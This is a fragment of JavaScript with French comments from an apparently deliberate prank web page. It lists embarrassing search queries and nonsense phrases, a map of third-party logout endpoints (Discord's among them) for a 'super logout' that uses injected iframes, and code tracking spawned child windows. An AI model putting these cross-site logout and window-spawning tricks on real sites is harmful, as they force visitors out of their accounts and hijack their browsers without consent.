...
const SEARCHES = [
  'où devrais-je enterrer le corps',
  'pourquoi mon oeil tremble-t-il',
  'pourquoi mon caca est-il vert',
  'pourquoi je me sens si vide',
  'pourquoi j\'ai toujours faim',
  'pourquoi ai-je toujours la diarrhée',
  'pourquoi mon anus me démange',
  'pourquoi mon nombril sent-il mauvais',
  'pourquoi mon chat m\'attaque-t-il',
  'pourquoi mon chien mange du caca',
  'pourquoi mon pet sent-il si mauvais',
  'pourquoi ma mère me déteste-t-elle',
  'pourquoi mon pipi sent-il mauvais',
  'pourquoi mon caca flotte-t-il',
...
const PHRASES = [
  'Les roues du bus tournent en rond, tournent en rond, tournent en rond. Les roues du bus tournent en rond, à travers toute la ville!',
  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
  'J\'aime les chatons moelleux, les yeux chaleureux, et faire semblant que les appareils ménagers ont des sentiments',
  'Je n\'ai jamais vu l\'intérieur de ma propre bouche car ça me fait peur à mort.',
...
const LOGOUT_SITES = {
  ...
  Discord: ['GET', 'https://discord.com/api/v9/auth/logout']
}

/**
 * Tableau pour stocker les fenêtres enfants créées par cette fenêtre.
 */
const wins = []

/**
 * Compteur du nombre de clics
 */
let interactionCount = 0

/**
 * Nombre d'iframes injectés dans la page pour la fonctionnalité "super logout".
 * Voir superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Cette fenêtre est-elle une fenêtre enfant ? Une fenêtre est une fenêtre
 * enfant s'il existe une fenêtre parent (c'est-à-dire que la fenêtre a été
 * ouverte par une autre fenêtre, donc `window.opener` est défini) *ET* que
 * ce parent est une fenêtre de la même origine (c'est-à-dire que la fenêtre a
 * été ouverte par nous, pas par un site externe)
 */
const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

/**
 * Cette fenêtre est-elle une fenêtre parent ?
 */
const isParentWindow = !isChildWindow

/*
 * Exécutez ce code dans toutes les fenêtres, *les deux* fenêtres enfants et
 * parents.
 */
init()
